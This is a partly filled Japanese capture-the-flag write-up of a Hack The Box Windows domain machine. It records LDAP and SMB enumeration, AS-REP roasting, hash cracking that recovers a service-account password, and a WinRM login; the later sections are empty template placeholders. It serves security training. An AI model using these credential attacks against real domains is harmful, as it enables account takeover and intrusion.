![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : 
- #easy #medium #hard #insane
- OS : #Linux #Windows
- Machine Author(s): 
- Hack Date: 2025-05-10,11:57,12:24-

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

- SMB匿名ログインできるかな
- LDAPも気になるね
- 認証情報とったら、WinRMにログイン

| **ポート**   | **サービス**      | **バージョン**                                            | **その他**                                          |
| --------- | ------------- | ---------------------------------------------------- | ------------------------------------------------ |
| 53/tcp    | domain        | Simple DNS Plus                                      |                                                  |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos                           | server time: 2025-05-10 03:03:08Z                |
| 135/tcp   | msrpc         | Microsoft Windows RPC                                |                                                  |
| 139/tcp   | netbios経由のSMB | Microsoft Windows netbios-ssn                        |                                                  |
| 389/tcp   | **ldap**      | Microsoft Windows Active Directory LDAP              | Domain: htb.local, Site: Default-First-Site-Name |
| 445/tcp   | **SMB**       | Microsoft Windows Server 2008 R2 - 2012 microsoft-ds | workgroup: HTB                                   |
| 464/tcp   | kpasswd5?     |                                                      |                                                  |
| 593/tcp   | ncacn_http    | Microsoft Windows RPC over HTTP 1.0                  | banner: ncacn_http/1.0                           |
| 636/tcp   | tcpwrapped    |                                                      |                                                  |
| 3268/tcp  | ldap          | Microsoft Windows Active Directory LDAP              | Domain: htb.local, Site: Default-First-Site-Name |
| 3269/tcp  | tcpwrapped    |                                                      |                                                  |
| 5985/tcp  | **WinRM**     | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)              | http-server-header: Microsoft-HTTPAPI/2.0        |
| 9389/tcp  | mc-nmf        | .NET Message Framing                                 |                                                  |
| 47001/tcp | http          | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)              | http-server-header: Microsoft-HTTPAPI/2.0        |
| 49664/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49665/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49666/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49667/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49671/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49680/tcp | ncacn_http    | Microsoft Windows RPC over HTTP 1.0                  | banner: ncacn_http/1.0                           |
| 49681/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49684/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49700/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |
| 49847/tcp | msrpc         | Microsoft Windows RPC                                |                                                  |

## Nmap
```bash
PORT      STATE SERVICE      REASON          VERSION
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-10 03:03:08Z)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
|_banner: ncacn_http/1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
|_banner: ncacn_http/1.0
49681/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49700/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49847/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (95%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows Server 2012 (93%)
No exact OS matches for host (test conditions non-ideal).

```

## SMB
- 匿名ログインで見れるファイルない
- 匿名ログインできてない?
```sh
└──╼ [★]$ smbclient -N -L //10.129.95.210
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.95.210 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```sh
└──╼ [★]$ smbmap -H 10.129.95.210 -u ''
[+] IP: 10.129.95.210:445	Name: 10.129.95.210                                     
┌─[sg-dedivip-1]─[10.10.14.14]─[snowyowl644@htb-v3bxujifti]─[~]
└──╼ [★]$ smbmap -H 10.129.95.210 -u 'guest'
[!] Authentication error on 10.129.95.210

```
## Feroxbuster
```bash
[sg-dedivip-1]─[10.10.14.14]─[snowyowl644@htb-v3bxujifti]─[~]
└──╼ [★]$ feroxbuster -u http://10.129.95.210:47001/
<SNIP>
──────────────────────────────────────────────────
404      GET        6l       24w      315c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
400      GET        6l       26w      324c http://10.129.95.210:47001/error%1F_log
[####################] - 8s     30000/30000   0s      found:1       errors:0      
[####################] - 7s     30000/30000   4311/s  http://10.129.95.210:47001/            
```

## LDAP
- 匿名ログインが可能

DC=htb,DC=local の直下にあるオブジェクト一覧のオブジェクト名
```sh
└──╼ [★]$ ldapsearch -x -H ldap://10.129.95.210 -b "DC=htb,DC=local" -s one cn
# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope oneLevel
# filter: (objectclass=*)
# requesting: cn 
#

# Builtin, htb.local
dn: CN=Builtin,DC=htb,DC=local
cn: Builtin

# Computers, htb.local
dn: CN=Computers,DC=htb,DC=local
cn: Computers

# Domain Controllers, htb.local
dn: OU=Domain Controllers,DC=htb,DC=local

# Employees, htb.local
dn: OU=Employees,DC=htb,DC=local

# ForeignSecurityPrincipals, htb.local
dn: CN=ForeignSecurityPrincipals,DC=htb,DC=local
cn: ForeignSecurityPrincipals

# Infrastructure, htb.local
dn: CN=Infrastructure,DC=htb,DC=local
cn: Infrastructure

# Keys, htb.local
dn: CN=Keys,DC=htb,DC=local

# LostAndFound, htb.local
dn: CN=LostAndFound,DC=htb,DC=local
cn: LostAndFound

# Managed Service Accounts, htb.local
dn: CN=Managed Service Accounts,DC=htb,DC=local
cn: Managed Service Accounts

# Microsoft Exchange Security Groups, htb.local
dn: OU=Microsoft Exchange Security Groups,DC=htb,DC=local

# Microsoft Exchange System Objects, htb.local
dn: CN=Microsoft Exchange System Objects,DC=htb,DC=local
cn: Microsoft Exchange System Objects

# NTDS Quotas, htb.local
dn: CN=NTDS Quotas,DC=htb,DC=local
cn: NTDS Quotas

# Program Data, htb.local
dn: CN=Program Data,DC=htb,DC=local
cn: Program Data

# Security Groups, htb.local
dn: OU=Security Groups,DC=htb,DC=local

# Service Accounts, htb.local
dn: OU=Service Accounts,DC=htb,DC=local

# System, htb.local
dn: CN=System,DC=htb,DC=local
cn: System

# TPM Devices, htb.local
dn: CN=TPM Devices,DC=htb,DC=local
cn: TPM Devices

# Users, htb.local
dn: CN=Users,DC=htb,DC=local
cn: Users

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local??base

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local??base

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local??base

# search result
search: 2
result: 0 Success

# numResponses: 22
# numEntries: 18
# numReferences: 3

```

Employeesの中を再起的に見る
```sh
ldapsearch -x -H ldap://10.129.95.210 -b "OU=Employees,DC=htb,DC=local" -s sub cn
```

整理した結果
- ユーザー名はわかったから、パスワードリスト攻撃とか？
```tree
OU=Employees
├── OU=Information Technology
│   ├── OU=Exchange Administrators
│   │   └── CN=Sebastien Caron
│   ├── OU=Developers
│   │   └── CN=Santi Rodriguez
│   ├── OU=Application Support
│   ├── OU=IT Management
│   │   └── CN=Lucinda Berger
│   ├── OU=Helpdesk
│   │   └── CN=Andy Hislip
│   ├── OU=Sysadmins
│   │   └── CN=Mark Brandt
├── OU=Sales
├── OU=Marketing
└── OU=Reception
```

- 説明欄とかにパスワードとかの認証情報ないかなって調べてみたけど特に見当たらず
```sh
└──╼ [★]$ ldapsearch -x -H ldap://10.129.206.80 -b "OU=Employees,DC=htb,DC=local" -s sub "(objectClass=user)" cn description info comment
```

- Service Accountsの中も見れた
	- svc-alfrescoっていうユーザーが存在してるのがわかる
```sh
└──╼ [★]$ ldapsearch -x -H ldap://10.129.206.80 -b "OU=Service Accounts,DC=htb,DC=local" -s sub cn
# extended LDIF
#
# LDAPv3
# base <OU=Service Accounts,DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: cn 
#

# Service Accounts, htb.local
dn: OU=Service Accounts,DC=htb,DC=local

# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 3
# numEntries: 2

```

このユーザーはSPNを持ってない
- 持ってたら、Kerberoastingできたけど
```sh
└──╼ [★]$ ldapsearch -x -H ldap://10.129.206.80 -b "CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local" servicePrincipalName
# extended LDIF
#
# LDAPv3
# base <CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local> with scope subtree
# filter: (objectclass=*)
# requesting: servicePrincipalName 
#

# svc-alfresco, Service Accounts, htb.local
dn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```



# Foothold
AS-REP Roastingの実行
ユーザーリストの生成
```sh
cat valid_ad_users

```
```sh
└──╼ [★]$ GetNPUsers.py htb.local/ -dc-ip 10.129.206.80 -no-pass -usersfile valid_ad_users 
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:ba1fdefa2d38cb6186a5e2879156645f$411086042bb06b79f892e39e33384a6e3df3c23465f638ad04eca0c9f908474df8f1f9776b8d459b8c3705f2f085a5b3c565ed723518d291dd183a51cb5ad3ebdc1e6ea2ed6efd1fc8bc003517e7711e04b55d28fdfa1879933f0946f00f11c928875cb6b575d6f3fd9018d6935f40ff20f7fcc39ab028ba79d285bd37df561c40f1e079b2e7f7e89c9459cceb291f1710550f3812e80abb06238a239e0d50b4b1f2bdfd8d75f25c59430f720b17308a133eb683651be4d88225273830298efb73fbd76b6a4b599c90827276a39b9729b8b811b20fd4d61f9cc0592ab631f350c9361d7a4ba7

```

ハッシュをクラックする
```sh
hashcat hash.txt /usr/share/wordlists/rockyou.txt

<SNIP>
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5asrep$23$svc-alfresco@HTB.LOCAL:ba1fdefa2d38cb6186a5e2879156645f$411086042bb06b79f892e39e33384a6e3df3c23465f638ad04eca0c9f908474df8f1f9776b8d459b8c3705f2f085a5b3c565ed723518d291dd183a51cb5ad3ebdc1e6ea2ed6efd1fc8bc003517e7711e04b55d28fdfa1879933f0946f00f11c928875cb6b575d6f3fd9018d6935f40ff20f7fcc39ab028ba79d285bd37df561c40f1e079b2e7f7e89c9459cceb291f1710550f3812e80abb06238a239e0d50b4b1f2bdfd8d75f25c59430f720b17308a133eb683651be4d88225273830298efb73fbd76b6a4b599c90827276a39b9729b8b811b20fd4d61f9cc0592ab631f350c9361d7a4ba7:s3rvice
<SNIP>
```

### 認証情報1
ハッシュがクラックできて、svc-alfrescoの認証情報が見つかった
svc-alfresco : s3rvice

- 得た認証情報を使って、SMBとLDAP、WinRMにログインして、どのサービスで有効なアカウントなのかと、匿名ログイン以上に見れる情報があるのかを確認する
- SMBにはログインできたけど、特に目立った共有フォルダはない
```bash
──╼ [★]$ smbmap -H 10.129.206.80 -u svc-alfresco -p 's3rvice'
[+] IP: 10.129.206.80:445	Name: 10.129.206.80                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 

```

LDAPも匿名ログインでは見れなかったUsersフォルダも見れる
```bash
ldapsearch -x -b "OU=Users,DC=htb,DC=local" -D "CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local" -w 's3rvice' -H ldap://10.129.206.80 -b "DC=htb,DC=local" -s sub cn

 <SNIP>
```

改めて、SPNが登録されているユーザーがいないか確かめる
- いない
```bash
└──╼ [★]$ ldapsearch -x -D "CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local" -w 's3rvice' -H ldap://10.129.206.80 -b "DC=htb,DC=local" -s sub "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName servicePrincipalName userAccountControl

# extended LDIF
#
# LDAPv3
# base <DC=htb,DC=local> with scope subtree
# filter: (&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
# requesting: sAMAccountName servicePrincipalName userAccountControl 
#

# FOREST, Domain Controllers, htb.local
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
userAccountControl: 532480
sAMAccountName: FOREST$
servicePrincipalName: TERMSRV/FOREST
servicePrincipalName: TERMSRV/FOREST.htb.local
servicePrincipalName: exchangeAB/FOREST
servicePrincipalName: exchangeAB/FOREST.htb.local
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/FOREST.htb.loc
 al
servicePrincipalName: ldap/FOREST.htb.local/ForestDnsZones.htb.local
servicePrincipalName: ldap/FOREST.htb.local/DomainDnsZones.htb.local
servicePrincipalName: DNS/FOREST.htb.local
servicePrincipalName: GC/FOREST.htb.local/htb.local
servicePrincipalName: RestrictedKrbHost/FOREST.htb.local
servicePrincipalName: RestrictedKrbHost/FOREST
servicePrincipalName: RPC/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loca
 l
servicePrincipalName: HOST/FOREST/HTB
servicePrincipalName: HOST/FOREST.htb.local/HTB
servicePrincipalName: HOST/FOREST
servicePrincipalName: HOST/FOREST.htb.local
servicePrincipalName: HOST/FOREST.htb.local/htb.local
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/236ba33a-7959-4a41-
 b959-5f82689a0871/htb.local
servicePrincipalName: ldap/FOREST/HTB
servicePrincipalName: ldap/236ba33a-7959-4a41-b959-5f82689a0871._msdcs.htb.loc
 al
servicePrincipalName: ldap/FOREST.htb.local/HTB
servicePrincipalName: ldap/FOREST
servicePrincipalName: ldap/FOREST.htb.local
servicePrincipalName: ldap/FOREST.htb.local/htb.local

# EXCH01, Computers, htb.local
dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
userAccountControl: 4096
sAMAccountName: EXCH01$
servicePrincipalName: IMAP/EXCH01
servicePrincipalName: IMAP/EXCH01.htb.local
servicePrincipalName: IMAP4/EXCH01
servicePrincipalName: IMAP4/EXCH01.htb.local
servicePrincipalName: POP/EXCH01
servicePrincipalName: POP/EXCH01.htb.local
servicePrincipalName: POP3/EXCH01
servicePrincipalName: POP3/EXCH01.htb.local
servicePrincipalName: exchangeRFR/EXCH01
servicePrincipalName: exchangeRFR/EXCH01.htb.local
servicePrincipalName: exchangeAB/EXCH01
servicePrincipalName: exchangeAB/EXCH01.htb.local
servicePrincipalName: exchangeMDB/EXCH01
servicePrincipalName: exchangeMDB/EXCH01.htb.local
servicePrincipalName: SMTP/EXCH01
servicePrincipalName: SMTP/EXCH01.htb.local
servicePrincipalName: SmtpSvc/EXCH01
servicePrincipalName: SmtpSvc/EXCH01.htb.local
servicePrincipalName: WSMAN/EXCH01
servicePrincipalName: WSMAN/EXCH01.htb.local
servicePrincipalName: RestrictedKrbHost/EXCH01
servicePrincipalName: HOST/EXCH01
servicePrincipalName: RestrictedKrbHost/EXCH01.htb.local
servicePrincipalName: HOST/EXCH01.htb.local

# search reference
ref: ldap://ForestDnsZones.htb.local/DC=ForestDnsZones,DC=htb,DC=local

# search reference
ref: ldap://DomainDnsZones.htb.local/DC=DomainDnsZones,DC=htb,DC=local

# search reference
ref: ldap://htb.local/CN=Configuration,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3

```

新しく得られたユーザー情報でAS-REP Roastingできるかを確かめたけど、特になさそう
```bash
└──╼ [★]$ GetNPUsers.py htb.local/ -dc-ip 10.129.206.80 -no-pass -usersfile users.txt
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
<SNIP>
```

WinRMへのログイン成功
```bash
──╼ [★]$ evil-winrm -i 10.129.206.80 -u svc-alfresco -p 's3rvice'                  
Evil-WinRM shell v3.5
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

user.txtの検索
```Powershell
Get-ChildItem -Recurse -Path C:\ -Include *user*.txt | Where-Object { -not $_.PSIsContainer }
<SNIP>
    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/10/2025   2:14 PM             34 user.txt

<SNIP>
```


```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Privileged IT Accounts                 Group            S-1-5-21-3072663084-364016917-1341370565-1149 Mandatory group, Enabled by default, Enabled group
HTB\Service Accounts                       Group            S-1-5-21-3072663084-364016917-1341370565-1148 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```

PowerViewをインポートして、HTB\Privileged IT Accounts とHTB\Service Accountsについて調べる
```Powershell
Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Get-DomainGroupMember -Identity "Privileged IT Accounts"
Exception calling "GetNames" with "1" argument(s): "Value cannot be null.
Parameter name: enumType"
At C:\Users\svc-alfresco\Desktop\powerview.ps1:6564 char:9
+         $UACValueNames = [Enum]::GetNames($UACEnum)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentNullException
Cannot validate argument on parameter 'ValidateSet'. The argument is null or empty. Provide an argument that is not null or empty, and then try the command again.
At C:\Users\svc-alfresco\Desktop\powerview.ps1:6568 char:59
+ ... -DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ( ...
+                                                    ~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [New-DynamicParameter], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,New-DynamicParameter


GroupDomain             : htb.local
GroupName               : Privileged IT Accounts
GroupDistinguishedName  : CN=Privileged IT Accounts,OU=Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Service Accounts
MemberDistinguishedName : CN=Service Accounts,OU=Security Groups,DC=htb,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1148
```

注目すべきグループ権限





- **Tactics**:
    - #Tactic_初期アクセス
    - #Tactic_Escution_実行
- **Techniques**:
    - #T1190_公開アプリケーションのエクスプロイト
    - #T1059_コマンドとスクリプトインタープリタ
    - #T1078_有効なアカウント
    - その他のInitial Access/Execution関連技術...




# Lateral Movement
<横方向の動きに関する説明をここに書いてください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```



- **Tactics**:
    - #Tactic_横移動
- **Techniques**:
    - #T1021_リモートサービス
    - #T1078_有効なアカウント





# Privilege Escalation
<特権昇格の詳細をここに記載してください>
```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```

```bash

```



- **Tactics**:
    - #Tactic_特権昇格
- **Techniques**:
    - #T1068_特権昇格のためのエクスプロイト
    - #T1055_プロセス注入
    - #T1053_スケジュールされたタスク/ジョブ
    - その他のPrivilege Escalation関連技術...




## Notes

- **Tactics**:
    - #Tactic_永続化
    - #Tactic_防御回避
- **Techniques**:
    - #T1098_アカウント操作
    - #T1553_信頼制御の転覆
    - #T1070_ホスト上の痕跡削除
    - その他のPersistence/Defense Evasion関連技術...

<このWriteupで特に重要な点や学んだことを追加で記載するセクション>

## Flags

- **User**: `<md5>`
- **Root**: `<md5>`

### ポイント


- 簡単なポイントあったら